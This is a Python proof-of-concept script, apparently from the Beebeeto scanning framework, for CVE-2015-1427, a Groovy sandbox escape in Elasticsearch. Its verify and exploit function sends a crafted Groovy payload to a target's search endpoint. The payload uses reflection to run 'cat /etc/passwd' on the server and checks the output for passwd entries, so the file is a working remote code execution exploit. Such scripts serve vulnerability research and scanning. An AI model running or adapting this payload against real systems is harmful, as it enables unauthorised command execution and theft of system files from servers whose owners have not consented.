#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import json
import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0048',
            'name': 'ElasticSearch Groovy脚本远程代码执行漏洞（CVE-2015-1427）POC',
            'author': '雷锋',
            'create_date': '2015-03-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [9200],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Elasticsearch',
            'vul_version': ['*'],
            'type': 'Code Execution',
            'tag': ['Elasticsearch代码执行漏洞', 'Elasticsearch', 'JAVA', 'CVE-2015-1427'],
            'desc': '''
                    ElasticSearch是一个JAVA开发的搜索分析引擎。2014年，曾经被曝出过一个远程代码执行漏洞（CVE-2014-3120），
                    漏洞出现在脚本查询模块，由于搜索引擎支持使用脚本代码（MVEL），作为表达式进行数据操作，
                    攻击者可以通过MVEL构造执行任意java代码，后来脚本语言引擎换成了Groovy，
                    并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。
                    ''',
            'references': [
                   'http://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=202983721&idx=1&sn=bde079dcee38c4c655e920cbcc78c6e8&scene=0',
                   'http://zone.wooyun.org/content/18915',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/_search?pretty'
        cs = {
                'size':'1',
                'script_fields':
                {'iswin':
                    {'script':
                        'java.lang.Math.class.forName(\"java.io.BufferedReader\").\
                        getConstructor(java.io.Reader.class).newInstance(java.lang.\
                        Math.class.forName(\"java.io.InputStreamReader\").getConstructor\
                        (java.io.InputStream.class).newInstance(java.lang.Math.class.forName\
                        (\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream()))\
                        .readLines()','lang':'groovy'
                    }
                }
             }
        jdata = json.dumps(cs)
        req = urllib2.urlopen(verify_url, jdata)
        content = req.read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())